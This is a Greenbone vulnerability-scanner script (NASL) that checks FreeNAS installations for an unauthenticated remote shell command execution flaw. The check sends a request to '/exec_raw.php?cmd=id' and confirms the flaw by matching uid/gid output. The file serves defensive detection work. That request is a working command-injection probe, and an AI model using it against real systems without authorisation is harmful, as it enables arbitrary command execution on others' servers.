# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:freenas:freenas";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100912");
  script_version("2025-09-11T05:38:37+0000");
  script_tag(name:"last_modification", value:"2025-09-11 05:38:37 +0000 (Thu, 11 Sep 2025)");
  script_tag(name:"creation_date", value:"2010-11-19 13:40:50 +0100 (Fri, 19 Nov 2010)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2010-20059");

  script_name("FreeNAS Remote Shell Command Execution Vulnerability");

  script_xref(name:"URL", value:"http://web.archive.org/web/20131004103437/http://www.securityfocus.com/bid/44974");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/freenas/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_freenas_detect.nasl");
  script_mandatory_keys("freenas/detected");

  script_tag(name:"summary", value:"FreeNAS is prone to a shell-command-execution vulnerability
  because the application fails to properly sanitize user-supplied input.

  An attacker can exploit the remote shell-command-execution issue to execute arbitrary shell
  commands in the context of the webserver process.

  FreeNAS versions prior to 0.7.2 rev.5543 are vulnerable.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"affected", value:"FreeNAS versions prior to 0.7.2 rev.5543.");
  script_tag(name:"solution", value:"Update to version 0.7.2 rev 5543 or later.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/exec_raw.php?cmd=id";

if (http_vuln_check(port: port,url: url, pattern: "uid=[0-9]+.*gid=[0-9]+.*")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
